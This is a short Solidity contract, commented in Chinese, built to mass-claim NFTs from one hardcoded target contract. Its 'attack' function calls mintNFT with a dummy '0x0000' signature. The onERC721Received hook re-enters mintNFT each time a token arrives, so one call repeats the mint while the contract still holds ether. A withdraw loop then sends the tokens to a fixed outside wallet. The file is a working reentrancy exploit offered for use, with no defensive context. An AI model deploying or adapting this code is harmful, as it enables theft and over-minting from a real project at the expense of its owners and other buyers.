// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IAir {
    function mintNFT(uint256 num,bytes memory _sign) payable external;
    function safeTransferFrom(address from,address to,uint256 tokenId) external;
}


//部署这个类
contract batch_claim_token is IERC721Receiver  {


    constructor(){}

    address public se;
    uint256 public id;

    //调用这个函数，参数就是领取数量
    function attack(address token) payable public{
            IAir(token).mintNFT{value: 0.4 ether}(1,'0x0000');
    }

    function onERC721Received(address, address, uint256, bytes memory) external override  returns (bytes4) {
        if(address(this).balance >= 0.4 ether){
                IAir(0x6F99fa6D60D410b60E7362d21d4b36D0e66b9A8A).mintNFT{value: 0.4 ether}(1,'0x0000');
        }
        return this.onERC721Received.selector;
    }

    function withdraw(uint256 start,uint256 end) public {
        for(uint i=start;i<end;i++){
            IAir(0x6F99fa6D60D410b60E7362d21d4b36D0e66b9A8A).safeTransferFrom(address(this),0x8a09FB23E1c8d0FF9c9Fef0BcFc9b9e07B1f0667,i);
        }
    }

    // Fallback function is called when msg.data is not empty
    fallback() external payable {}

    // Function to receive Ether. msg.data must be empty
    receive() external payable {}
}